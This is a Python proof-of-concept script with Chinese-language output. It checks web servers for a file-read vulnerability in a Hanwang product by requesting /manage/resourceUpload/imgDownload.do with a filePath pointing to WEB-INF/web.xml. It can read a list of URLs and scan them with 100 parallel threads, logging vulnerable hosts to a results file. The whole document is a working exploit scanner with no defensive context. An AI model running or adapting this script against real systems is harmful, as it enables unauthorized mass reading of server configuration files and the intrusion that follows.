import argparse,requests,sys,re
from multiprocessing.dummy import Pool

def poc(target):
    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    target = target.rstrip('/')
    payload="/manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/web.xml&recoToken=SGUsqvF7cVS"
    header= {
        "Accept-Encoding": "gzip, deflate",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    }
    try:
        re1=requests.get(url=target,timeout=5,verify=False)
        if re1.status_code==200:
            re2 = requests.get(url=target+payload,timeout=5,verify=False)
            if len(re2.text) >=4000:    #判断响应包长度是否符合
                print(f'[+]{target}存在文件读取漏洞')
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write('汉王文件读取'+target+'\n')
            else:
                print(f'[-]{target}不存在漏洞')
        else:
            print(f'[*]{target}访问有问题')
    except:
        pass
def main():
    
    parse = argparse.ArgumentParser(description="汉王文件读取漏洞")

    parse.add_argument('-u','--url',type=str,dest='url',help='输入url测试')
    parse.add_argument('-file','--file',type=str,dest='file',help='输入url文件测试')

    args =parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.closer()
        mp.join()
    else:
        print(f"Python {sys.argv[0]} ")
            
    
if __name__=='__main__':
    main()